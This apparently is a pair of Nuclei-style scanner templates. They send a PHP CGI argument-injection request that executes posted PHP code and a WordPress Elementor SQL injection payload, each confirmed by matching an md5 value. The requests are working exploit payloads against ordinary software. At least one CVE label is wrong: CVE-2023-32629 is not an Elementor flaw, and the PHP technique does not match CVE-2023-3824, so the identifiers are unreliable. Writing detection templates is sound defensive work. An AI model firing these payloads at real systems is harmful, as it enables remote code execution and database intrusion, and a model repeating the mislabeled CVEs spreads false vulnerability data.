## CVE-2023-3824 - PHP CGI Argument Injection
id: CVE-2023-3824
info:
  name: PHP CGI Argument Injection (CVE-2023-3824)
  author: Tamilsevan S
  severity: critical
  tags: cve,cve2023,rce,php,cgi,injection
  reference:
    - https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-8jj7

requests:
  - method: POST
    path:
      - "{{BaseURL}}/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
    body: |
      <?php echo md5('CVE-2023-3824'); ?>
    matchers:
      - type: word
        words:
          - "1fc76cb929e6e95c02fd2c2a5ae1ff5c"

## CVE-2023-32629 - WordPress Elementor SQL Injection
id: CVE-2023-32629
info:
  name: WordPress Elementor SQL Injection
  author: Tamilsevan S
  severity: critical
  tags: cve,cve2023,sql,sqli,wordpress,wp-plugin,elementor

requests:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=elementor_ajax&editor_post_id=1&data=template%3D'+(SELECT MD5(1234))+--+-&nonce=anything
    matchers:
      - type: word
        words:
          - "81dc9bdb52d04dc20036dbd8313ed055"

